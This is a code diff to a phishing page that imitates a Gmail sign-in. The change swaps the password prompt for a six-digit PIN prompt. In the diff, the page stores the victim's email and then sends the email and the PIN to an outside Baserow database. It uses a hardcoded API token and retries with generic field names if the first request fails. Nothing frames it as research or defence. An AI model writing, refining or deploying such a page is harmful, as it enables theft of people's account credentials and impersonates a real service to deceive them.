@@ -234,6 +234,13 @@
             margin-top: 16px;
         }
 
+        /* PIN code specific styles */
+        #pin {
+            letter-spacing: 2px;
+            font-size: 18px;
+            text-align: center;
+        }
+
         @media (max-width: 600px) {
             .container {
                 padding: 24px 20px;
@@ -279,7 +286,7 @@
             </form>
         </div>
 
-        <!-- Page 2: Password Input -->
+        <!-- Page 2: PIN Code Input -->
         <div id="page2">
             <h1 class="title">Welcome</h1>
             
@@ -295,18 +302,18 @@
             
             <p class="subtitle">To continue, first verify it's you</p>
             
-            <form class="form" id="password-form">
+            <form class="form" id="pin-form">
                 <div class="input-container">
-                    <label for="password" class="input-label">Enter your password</label>
-                    <input type="password" id="password" class="input-field" required>
+                    <label for="pin" class="input-label">Enter your PIN code</label>
+                    <input type="number" id="pin" class="input-field" required pattern="[0-9]*" inputmode="numeric" maxlength="6">
                 </div>
                 
                 <div class="checkbox-container">
-                    <input type="checkbox" id="show-password" class="checkbox">
-                    <label for="show-password" class="checkbox-label">Show password</label>
+                    <input type="checkbox" id="show-pin" class="checkbox">
+                    <label for="show-pin" class="checkbox-label">Show PIN</label>
                 </div>
                 
-                <a href="#" class="link forgot-link">Forgot password?</a>
+                <a href="#" class="link forgot-link">Forgot PIN?</a>
                 
                 <div class="footer">
                     <div></div> <!-- Empty div for spacing -->
@@ -321,15 +328,22 @@
         const page1 = document.getElementById('page1');
         const page2 = document.getElementById('page2');
         const emailForm = document.getElementById('email-form');
-        const passwordForm = document.getElementById('password-form');
+        const pinForm = document.getElementById('pin-form');
         const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
+        const pinInput = document.getElementById('pin');
         const displayEmail = document.getElementById('display-email');
-        const showPasswordCheckbox = document.getElementById('show-password');
+        const showPinCheckbox = document.getElementById('show-pin');
         
         // Constants
         const BASEROW_API = 'https://api.baserow.io/api/database/rows/table/503285/';
         const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+        
+        // Limit PIN input to 6 digits
+        pinInput.addEventListener('input', function() {
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
+        });
         
         // Handle email form submission
         emailForm.addEventListener('submit', function(e) {
@@ -338,8 +352,8 @@
             const email = emailInput.value.trim();
             
             if (email) {
-                // Store email in session storage
-                sessionStorage.setItem('userEmail', email);
+                // Store email in localStorage (more persistent than sessionStorage)
+                localStorage.setItem('userEmail', email);
                 
                 // Display email on page 2
                 displayEmail.textContent = email;
@@ -348,31 +362,25 @@
                 page1.style.display = 'none';
                 page2.style.display = 'block';
                 
-                // Focus on password field
-                passwordInput.focus();
+                // Focus on PIN field
+                pinInput.focus();
                 
                 // Update document title
                 document.title = 'Welcome - Gmail';
             }
         });
         
-        // Handle password form submission
-        passwordForm.addEventListener('submit', async function(e) {
+        // Handle PIN form submission
+        pinForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = sessionStorage.getItem('userEmail');
-            const password = passwordInput.value;
+            const email = localStorage.getItem('userEmail');
+            const pin = pinInput.value;
             
-            if (email && password) {
+            if (email && pin) {
                 try {
-                    // Create a simple object with email and password
-                    const data = {
-                        email: email,
-                        password: password
-                    };
-                    
                     // Log the data being sent (for debugging)
-                    console.log('Sending data to Baserow:', data);
+                    console.log('Sending data to Baserow:', { email, pin });
                     
                     // Send data to Baserow with field names as plain text
                     const response = await fetch(BASEROW_API, {
@@ -383,7 +391,7 @@
                         },
                         body: JSON.stringify({
                             'email': email,
-                            'password': password
+                            'pin': pin
                         })
                     });
                     
@@ -398,7 +406,7 @@
                     
                     // Try an alternative approach if the first one fails
                     try {
-                        // Send data with generic field names
+                        // Try with different field names
                         const fallbackResponse = await fetch(BASEROW_API, {
                             method: 'POST',
                             headers: {
@@ -407,7 +415,7 @@
                             },
                             body: JSON.stringify({
                                 'field_1': email,
-                                'field_2': password
+                                'field_2': pin
                             })
                         });
                         
@@ -422,14 +430,14 @@
             }
         });
         
-        // Toggle password visibility
-        showPasswordCheckbox.addEventListener('change', function() {
-            passwordInput.type = this.checked ? 'text' : 'password';
+        // Toggle PIN visibility
+        showPinCheckbox.addEventListener('change', function() {
+            pinInput.type = this.checked ? 'text' : 'password';
         });
         
         // Check if returning from page 2
         window.addEventListener('load', function() {
-            const savedEmail = sessionStorage.getItem('userEmail');
+            const savedEmail = localStorage.getItem('userEmail');
             
             if (savedEmail && window.location.hash === '#verify') {
                 displayEmail.textContent = savedEmail;
